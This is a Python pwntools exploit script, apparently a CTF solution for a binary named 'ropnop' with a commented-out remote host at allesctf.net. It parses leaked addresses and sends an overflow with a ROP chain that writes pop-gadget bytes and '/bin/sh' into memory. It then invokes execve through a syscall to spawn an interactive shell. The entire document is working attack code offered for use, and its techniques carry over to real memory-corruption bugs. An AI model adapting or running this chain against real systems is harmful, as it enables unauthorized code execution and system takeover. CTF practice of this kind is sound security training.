from pwn import *

p = process("./ropnop")
#p = remote("hax1.allesctf.net", 9300)

p.recvuntil("[defusing returns] start: ")
START = int(p.recvuntil(" - end: ").replace(" - end: ", ""), 16)
STOP = int(p.recvline(), 16)

RET = START + 0x1374

NEW_RET = START + 0x1234

EDX_READ = START + 0x12ca

POP_RDI_RET = START + 0x1353
POP_RSI_POP_R15_RET = START + 0x1351
SYSCALL = START + 0x11e4

log.info("Leaked START value 0x{:x}".format(START))
log.info("Leaked STOP value 0x{:x}".format(STOP))
log.info("Leaked NEW_RET value 0x{:x}".format(NEW_RET))
log.info("Leaked RET value 0x{:x}".format(RET))
log.info("Leaked POP_RDI_RET value 0x{:x}".format(POP_RDI_RET))
log.info("Leaked POP_RSI_POP_R15_RET value 0x{:x}".format(POP_RSI_POP_R15_RET))
log.info("Leaked EDX_READ value 0x{:x}".format(EDX_READ))
log.info("Leaked SYSCALL value 0x{:x}".format(SYSCALL))

raw_input("attach gdb")

POP_RAX_RET = START + 0x1235
POP_RSI_RET = START + 0x1237
POP_RDX_RET = START + 0x1239
BINSH = START + 0x123b

PADDING = "A"*cyclic_find("gaaa")
PADDING2 = "B"*8
p.sendline(PADDING + p64(RET) + p64(RET) + p64(POP_RSI_POP_R15_RET) + p64(NEW_RET) + PADDING2 + p64(RET) + p64(EDX_READ) + p64(RET) + p64(POP_RAX_RET) + p64(0x3b) + p64(RET) + p64(RET) + p64(POP_RDI_RET) + p64(BINSH) + p64(RET) + p64(RET) + p64(POP_RSI_RET) + p64(0x0) + p64(RET) + p64(RET) + p64(POP_RDX_RET) + p64(0x0) + p64(RET) + p64(RET) + p64(SYSCALL))
POP_RAX_RET_COMMAND = p8(0x58) + p8(0xc3)
POP_RSI_RET_COMMAND = p8(0x5e) + p8(0xc3)
POP_RDX_RET_COMMAND = p8(0x5a) + p8(0xc3)
BINSH_COMMAND = "/bin/sh\x00"

log.info("Leaked POP_RAX_RET value 0x{:x}".format(POP_RAX_RET))
log.info("Leaked POP_RSI_RET value 0x{:x}".format(POP_RSI_RET))
log.info("Leaked POP_RDX_RET value 0x{:x}".format(POP_RDX_RET))

p.sendline(p8(0xc3) + POP_RAX_RET_COMMAND + POP_RSI_RET_COMMAND + POP_RDX_RET_COMMAND + BINSH_COMMAND + p8(0x90)*0x9f + p8(0xc3))

p.interactive()